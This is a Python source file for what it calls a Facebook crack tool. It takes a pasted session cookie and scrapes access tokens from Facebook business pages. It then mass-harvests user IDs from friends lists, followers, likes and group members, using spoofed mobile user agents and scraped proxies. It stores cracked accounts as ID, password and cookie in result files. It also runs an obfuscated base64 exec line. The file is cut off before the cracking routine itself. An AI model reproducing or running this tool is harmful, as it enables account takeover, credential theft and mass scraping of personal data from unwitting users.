#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
exec(base64.b64decode(b'ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhaw=='))
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
# UA LIST
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('GAGAL')
prox=open('.prox.txt','r').read().splitlines()
#os.system('rm -rf .prox.txt')

for xd in range(1000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
#	ugen2.append(uaku)

for jiah in range(1000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SAMSUNG SM-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(678, 9999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
#	g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0  Chrome/'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;com.facebook.orca;com.facebook.lite;com.facebook.katana FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
#	uaku2=f'{aa} {b}; {c}{e}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for bb in range(1000):

	a='BlackBerry'
	b=random.randrange(4000, 9999)
	c=random.randrange(1,6)
	d=random.choice(['0','1','2','3','4','5','6'])
	e='0'
	f=random.randrange(100, 999)
	g='Profile/MIDP-'
	h='2'
	i=random.choice(['0','1'])
	j='Configuration/CLDC-1.1'
	k='VendorID/'
	l=random.randrange(100, 999)
	ua=f'{a}{b}/{c}.{d}.{e}.{f} {g}{h}.{i} {j} {k}{l}'
	ugen2.append(ua)

def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[]
lisensiku=['sukses']
cokbrut=[]
pwpluss,pwnya=[],[]

def cocok():
	try:
		cokbru=open('.cookie.txt').read()
		cokbrut.append(cokbru)
	except:
		login_lagi334()
# COLORS
x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tpc = 'TAP-A2F-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
def clear():
	os.system('clear')
# BACK
def back():
	login()
# BANNER
def banner():
	clear()
	wel='# WELCOME TO FACEBOOK CRACK TOOL'
	cik2=mark(wel ,style='red')
	sol().print(cik2)


	ban='''tolls prem/pribadi
     WA GW:6283862287464
     WA CWE GW:ANJJ LU KEPO
     AU:Amir
     NOTE:ambil cwe gw gw tendang lu'''
	oi = nel(tekz(ban,justify='center',style='bold'), style='green')
	cetak(nel(oi, title='[bold red] • DEVELOVER INFORMATION • [/bold red]'))
# VALIDASI TOKEN
def login():
	if 'sukses' in lisensiku:
#		uaku()
		cocok()
		try:
			token = open('.token.txt','r').read()
			tokenku.append(token)
			try:
				sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]})
				sy2 = json.loads(sy.text)['name']
				sy3 = json.loads(sy.text)['id']
				menu(sy2,sy3)
			except KeyError:
				login_lagi334()
			except requests.exceptions.ConnectionError:
				banner()
				li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
				lo = mark(li, style='red')
				sol().print(lo, style='cyan')
				exit()
		except IOError:
			login_lagi334()
	else:lisensi()

# LOGIN
def login_lagi334():
	banner()
	sky = '[bold cyan][01] LOGIN COKIES VERSI 01\n[02] LOGIN COOKIE VERSI 02[/bold cyan]'
	sky2 = nel(sky, style='red')
#	cetak(nel(sky2,title='[bold cyan] • LOGIN MENU • [/bold cyan]'))
#	pil=input('[•] pilih : ')
	pil='1'
	if pil in ['1','01']:
		try:
			cik='# LOGIN USING COOKIE'
			cik2=mark(cik ,style='red')
			sol().print(cik2)
			cooki=input("Cookie : ")
			open('.cookie.txt','w').write(cooki)
			head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
			data = requests.get("https://business.facebook.com/business_locations", headers =head, cookies = {"cookie":cooki}) 
			find_token = re.search("(EAAG\w+)", data.text)
			ken=open(".token.txt", "w").write(find_token.group(1))
			cokrom=open('.cookie.txt','r').read()
			tokrom=open('.token.txt','r').read()
			tes = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokrom,cookies={'cookie': cokrom})
			tes3 = json.loads(tes.text)['id']
			cik='# LOGIN SUCCESSFUL, JALANKAN ULANG '
			cik2=mark(cik ,style='green')
			sol().print(cik2)
			login()
		except Exception as e: 
			os.system("rm -f .token.txt")
			os.system("rm -rf .cookie.txt")
			cik='# EXPIRED COOKIE OR CHECKPOINT ACCOUNT '
			cik2=mark(cik ,style='red')
			sol().print(cik2) 
			exit()
	elif pil in ['2','02']:
		try:
			cik='# LOGIN USING COOKIE V2 '
			cik2=mark(cik ,style='cyan')
			sol().print(cik2)
			cookie=input("[•] Cookie : ")
			headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
			ses=requests.Session()
			req = ses.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers,cookies={'cookie': cookie})
			cari_id = re.findall('act=(.*?)&nav_source', req.text)
			for bn in cari_id:
				rex = ses.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={bn}&nav_source=no_referrer', headers = headers,cookies={'cookie': cookie})
				token = re.search('(EAAB\w+)', rex.text).group(1)
				ken=open(".token.txt", "w").write(token)
			cik='# LOGIN SUCCESSFUL, RUN AGAIN '
			cik2=mark(cik ,style='green')
			sol().print(cik2)
			exit()
		except Exception as e: 
			os.system("rm -f .token.txt")
			cik='# EXPIRED COOKIE OR CHECKPOINT ACCOUNT '
			cik2=mark(cik ,style='green')
			sol().print(cik2) 
			exit()



#VALIDASI LISENSI
def anoun():
	res=requests.Session().get('https://raw.githubusercontent.com/EC-1709/a/main/Anoun.json').json()
	stanoun=res['status']
	if stanoun== "ON":
		oi = nel(tekz(str(res['isi']), justify="center"), style='yellow')
		cetak(nel(oi, title='[bold cyan] • INFORMATION • [/bold cyan]'))
		cik='# PRESS ENTER TO CONTINUE'
		cik2=mark(cik ,style='cyan')
		sol().print(cik2)
		en=input('.lisen.txt')
	else:pass
	login()
def tlisensi():
	banner()
	wel='# LICENSE IS NOT APPLICABLE OR WRONG'
	wel2 = mark(wel, style='red')
	sol().print(wel2)
	time.sleep(2)
	lisen=input('[•] Enter License : ')
	open('.lisen.txt','w').write(lisen)
	lisensi()


def lisensi():
	try:
		cek=open('.lisen.txt').read()
		lisensikuni.append(cek)
	except:
		tlisensi()
	ses=requests.Session()
	res=requests.get('https://app.cryptolens.io/api/key/Activate?token=WyIxOTgzMDgxOCIsImtjQTQwRjVVSGlNNzRub1k2dllNajBSY2JjMUgyY2MrS3hqN1F6c0QiXQ==&ProductId=15479&Key='+lisensikuni[0]).json()
	status=res['licenseKey']['key']
	if status ==cek:
		banner()
		wel='# LICENSE APPLICABLE '
		wel2 = mark(wel, style='cyan')
		sol().print(wel2)
		time.sleep(2)
		lisensiku.append("sukses")
	else:
		tlisensi()
	anoun()

# MENU
def menu(my_name,my_id):
	try:sh = requests.get('https://httpbin.org/ip').json()
	except:sh = {'origin':'-'}
	try:
		tglx = my_birthday.split('/')[1]
		blnx = dic2[str(my_birthday.split('/')[0])]
		thnx = my_birthday.split('/')[2]
		birth = tglx+' '+blnx+' '+thnx
	except:birth = '-'
	banner()
	sg = '# USER ACCOUNT INFORMATION'
	fx = mark(sg, style='green')
	sol().print(fx)
	print(x+'['+h+'•'+x+'] ACTIVE USER : '+str(my_name))
	print(x+'['+h+'•'+x+'] USER ID     : '+str(my_id))
	print(x+'['+h+'•'+x+'] IP ADDRESS  : '+str(sh['origin']))
	io = '''[bold green][01] DUMP ID PUBLIK	    
[02] DUMP ID PUBLIK (MASAL)   		     [bold green]'''
	oi = nel(io, style='blue')
	cetak(nel(oi, title='[bold cyan] • MENU CRACK • [/bold cyan]'))
	ec = input(x+'['+p+'<>'+x+'] Pilih : ')
	if ec in ['1','01']:
		dump_publik()
	elif ec in ['2','02']:
		dump_massal()
	elif ec in ['3','03']:
		dump_pengikut()
	elif ec in ['4','04']:
		dump_likes()
	elif ec in ['5','05']:
		dump_grup()
	elif ec in ['6','06']:
		crack_file()
	elif ec in ['7','07']:
		file()
	elif ec in ['8','08']:
		result()
	elif ec in ['9','09']:
		tipsx()
	elif ec in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(x+'['+h+'•'+x+'] TUNNGU • • •')
		time.sleep(1)
		sw = '# SUCCESS OUT'
		sol().print(mark(sw, style='cyan'))
		exit()
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()

# RESULT CHECKER
def result():
	cek = '# CEK RESULT CRACK'
	sol().print(mark(cek, style='green'))
	kayes = '[bold cyan][01] CHECK CP RESULTS\n[02] CHECK OK RESULTS\n[00] BACK TO MENU[/bold cyan]'
	kis = nel(kayes, style='cyan')
	cetak(nel(kis, title='RESULTS'))
	kz = input(x+'['+p+'f'+x+'] pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('/sdcard/4MBF-DATA/CP')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# YOU DONT HAVE CP RESULTS'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# YOUR CP RESULT'
			sol().print(mark(gerr, style='cyan'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/4MBF-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			gerr2 = '# SELECT RESULTS TO SHOW'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] choose : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPTION NOT IN THE MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/4MBF-DATA/CP/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# YOUR CP ACCOUNT RESULT'
			sol().print(mark(akun, style='cyan'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			akun2 = '# YOUR CP ACCOUNT RESULT'
			sol().print(mark(akun, style='cyan'))
			input('[PRESS ENTER TO RETURN]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('/sdcard/4MBF-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# YOU DONT HAVE OK RESULTS'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			gerr = '# YOUR OK RESULT'
			sol().print(mark(gerr, style='green'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/4MBF-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			gerr2 = '# SELECT RESULTS TO SHOW'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] Choose : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# OPTION NOT IN THE MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/4MBF-DATA/OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()
			akun = '# YOUR OK ACCOUNT RESULT'
			sol().print(mark(akun, style='green'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			akun2 = '# YOUR OK ACCOUNT RESULT'
			sol().print(mark(akun, style='green'))
			input('[PRESS ENTER TO RETURN]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()

# OPEN
def file():
	tek = '# CHECK CEKPOINT FROM FILE'
	sol().print(mark(tek, style='cyan'), style='on red')
	print(x+'['+h+'•'+x+'] READING THE FILE, WAIT A MINUTE •••')
	time.sleep(2)
	teks = '# SELECT FILES TO CHECK'
	sol().print(mark(teks, style='cyan'))
	my_files = []
	try:
		lis = os.listdir('/sdcard/4MBF-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	if len(my_files)==0:
		yy = '# YOU DONT HAVE THE RESULTS TO CHECK'
		sol().print(mark(yy, style='red'))
		exit()
	else:
		cih = 0
		lol = {}
		for isi in my_files:
			try:hem = open('/sdcard/4MBF-DATA/CP/'+isi,'r').readlines()
			except:
				try:hem = open('/sdcard/4MBF-DATA/OK/'+isi,'r').readlines()
				except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
		teks2 = '# SELECT FILES TO CHECK'
		sol().print(mark(teks2, style='cyan'))
		geeh = input(x+'['+p+'f'+x+'] Choose : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPTION NOT IN THE MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:
			hf = open('/sdcard/4MBF-DATA/CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/4MBF-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
				hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
				sol().print(mark(hehe, style='red'))
				time.sleep(2)
				back()

# DUMP ID PUBLIK
def dump_publik():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP PUBLIC ID'
	win2 = mark(win, style='yellow')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
	pil = input(x+'['+p+'f'+x+'] INPUT TARGET ID : ')
	dumpdump(pil)
	print(x+'['+h+'•'+x+'] SEMUA  : '+str(len(id)))
	setting()
def dumpdump(pil):
	try:
		head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000){id,name}&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]},headers=head).json()
		try:
			kohe=koh2['friends']['paging']['cursors']['before']
		except:
			pass
		for pi in koh2['friends']['data']:
			try:
				iso=(pi['id']+'|'+pi['name']+'|'+pi['birthday'])
				if iso in id:pass
				else:id.append(iso)
			except:
				iso=(pi['id']+'|'+pi['name'])
				if iso in id:pass
				else:id.append(iso)
				continue
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION,PRESS ENTER TO CONTINUE'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		input('')
	except (KeyError,IOError):
			pass
# DUMP ID MASSAL
def dump_massal():
	mas='[01] CRACK DARI FILE\n[02] CRACK BEBAS(PER ID)'
	mas2=nel(mas,style='cyan')
	cetak(nel(mas2,title=' • MENU •'))
	pilih=input('[•] pilih : ')
	if pilih in ['1','01']:
		nmfil=input('[•] File Name : ')
		nmfile=open(nmfil,'r').read().splitlines()
		for xfil in nmfile:
			uid.append(xfil)
	elif pilih in ['2','02']:
		print(x+'['+h+'•'+x+'] MASUKAN TOTAL LIMIT SEGINI LAH KONTOL [20]')
		try:
			jum = int(input(x+'['+p+'f'+x+'] Number Of Id : '))
		except ValueError:
			pesan = '# THE INPUT YOU ENTER IS NOT A NUMBERS'
			pesan2 = mark(pesan, style='blue')
			sol().print(pesan2)
			exit()
		if jum<1 or jum>20:
			pesan = '# OUT OF RANGE MEN'
			pesan2 = mark(pesan, style='yellow')
			sol().print(pesan2)
			exit()
		ses=requests.Session()
		yz = 0
		print(x+'['+h+'•'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
		for met in range(jum):
			yz+=1
			kl = input(x+'['+h+str(yz)+x+'] Enter The '+str(yz)+'Id : ')
			uid.append(kl)
	sed='# SABAR SEDANG MEBGUMPULKAN ID'
	sol().print(mark(sed, style='red'))
	for userr in uid:
		dumpdump(userr)
	tot = '# SUCCESSFUL MENGUMPULKAN  %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='blue')
	else:
		tot2 = mark(tot, style='yellow')
	sol().print(tot2)
	setting()
#DUMP PENGIKUT
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID FROM FOLLOWERS'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FOLLOWERS')
	pil = input(x+'['+p+'f'+x+'] INPUT TARGET ID : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# FAILED DUMP OR BROKEN TOKEN'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
#DUMP LIKES
def dump_likes():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	win = '# DUMP ID FROM LIKE POST'
	win2 = mark(win, style='green')
	sol().print(win2)
	pil = input(x+'['+p+'f'+x+'] INPUT ID POST : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=likes.limit(10000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
		for pi in koh2['likes']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# POST IS NOT PUBLIC OR TOKEN BROKEN'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()

#DUMPS GRUP
def dump_grup():
	au = '# MAKE SURE THE PUBLIC GROUP ID IS NOT PRIVATE'
	au2 = mark(au, style='cyan')
	sol().print(au2)
	idgrup = input("[•] INPUT ID/USERNAME GRUP : ")
	link = "https://mbasic.facebook.com/groups/"+idgrup
	ses = requests.Session()
	try:
		res = sop(ses.get(link, headers={"user-agent": 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'}).text, "html.parser")
	except requests.exceptions.ConnectionError:
		au = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
		au2 = mark(win, style='cyan')
		sol().print(au2)
		time.sleep(0.5)
		exit()
	titt = res.find("title")
	titt2 = titt.text.replace(" | Facebook","").replace(" Grup Publik","")
	if titt2=='Masuk Facebook':
		au = '# LIMIT ON OFF AIRPLANE MODE & TRY AGAIN'
		au2 = mark(win, style='red')
		sol().print(au2)
		time.sleep(0.5)
		exit()
	elif titt2=='Kesalahan':
		au = '# GROUP NOT FOUND'
		au2 = mark(win, style='yellow')
		sol().print(au2)
		time.sleep(0.5)
		exit()
	else:pass
	xxb = res.find_all('table')
	totid = []
	for xb in xxb:
		totalid = xb.text
		tottalid = totalid.replace('Anggota','')
		try:
			jumid = int(tottalid)
			totid.append(jumid)
		except:
			pass
	au = 'GROUP NAME    : '+titt2+'\n'+'GROUP MEMBER : '+str(totid[0])
	oi = nel(au, style='cyan')
	cetak(nel(oi, title='[bold cyan] • GROUP TARGET •[/bold cyan]'))
	au = '[•] TO STOP PRESS CTRL+C\n[•] IF STUCK ON OF AIRPLANE MODE'
	oi = nel(au, style='cyan')
	cetak(nel(oi, title='[bold cyan] • SUGGESTION •[/bold cyan]'))
	linkm='https://mbasic.facebook.com/browse/group/members/?id='+idgrup
	pulkanid(linkm)
def pulkanid(linkmem):	
	member=ses.get(linkmem,cookies={'cookie': cokbrut[0]},headers={'user_agent': ''}).text
	memberr=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',member)
	for mem in memberr:
		if "profile.php?" in mem[0]:
			id.append(re.findall("id=(.*)",mem[0])[0]+"|"+mem[1])
		else:
			id.append(mem[0]+"|"+mem[1])
		sys.stdout.write('\r [•] COLLECTING  %s ID'%(len(id))); sys.stdout.flush()
	if "Lihat Selengkapnya" in member:
		time.sleep(2)
		pulkanid('https://mbasic.facebook.com'+sop(member,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
	else:
		def geh(gey):
			try:
				a=requests.get(gey,cookies={'cookie': cokbrut[0]}).text
				b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
				if len(b)!=0:
					for c in b:
						if "profile.php" in c[0]:
							d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
							if d in id:
								continue
							else:
								id.append(d+"|"+c[1])
						else:
							d=re.search("(.*?)\?refid",c[0]).group(1)
							if d in id:
								continue
							else:
								id.append(d+"|"+c[1])
						sys.stdout.write('\r  [•] COLLECTING %s ID'%(len(id))); sys.stdout.flush()
				if "Lihat Postingan Lainnya" in a:
					geh('https://mbasic.facebook.com'+sop(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				else:
					print('\n')
					setting()
			except requests.exceptions.ConnectionError:
				time.sleep(15)
				geh(gey)
			except KeyboardInterrupt:
				print('\n')
				setting()
		geh(f"https://mbasic.facebook.com/groups/"+re.search("id=(\\d*)",linkmem).group(1))
def crack_file():
	cek = '# CRACK FROM FILE DUMP'
	sol().print(mark(cek, style='green'))
	try:vin = os.listdir('/sdcard/4MBF-DATA/DUMP')
	except FileNotFoundError:
		gada = '# STORAGE NOT FOUND '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
		back()
	if len(vin)==0:
		haha = '# YOU DONT HAVE FILE DUMP RESULTS'
		sol().print(mark(haha, style='yellow'))
		time.sleep(2)
		back()
	else:
		gerr = '# YOUR FILE DUMP RESULT'
		sol().print(mark(gerr, style='cyan'))
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/4MBF-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
		gerr2 = '# SELECT RESULTS TO START CRACK'
		sol().print(mark(gerr2, style='green'))
		geeh = input(x+'['+p+'f'+x+'] choose : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPTION NOT IN THE MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/4MBF-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
def tipsx():
	print('NEXT UPDATE BRO')


# PENGATURAN ID
def setting():
	wl = '# CRAK DARI?'
	sol().print(mark(wl, style='green'))
	teks = '[01] OLD\n[02] MUDA\n[03] ACAK '
	tak = nel(teks, style='cyan')
	cetak(nel(tak, title=' • SETTING • '))
	hu = input(x+'['+p+'f'+x+'] pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()
	met = '# PILIH METODE'
	sol().print(mark(met, style='green'))
	ioz = '[01] METODE V1[RECOMNDASI]\n[02] METODE V2\n[03]'
	gess = nel(ioz, style='blue')
	cetak(nel(gess, title=' • METHOD • '))
	hc = input(x+'['+p+'f'+x+']  : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('touch')
	elif hc in ['4','04']:
		method.append('mbasic')
	else:
		method.append('mobile')
	guw = '# MENAMPILKAN APP TERKAIT ? (y/t)'
	sol().print(mark(guw, style='yellow'))
	aplik = input(x+'['+p+'f'+x+'] pilih : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	guw = '# MENAMPILKAN OPSI CEKPOIN ? (y/t)'
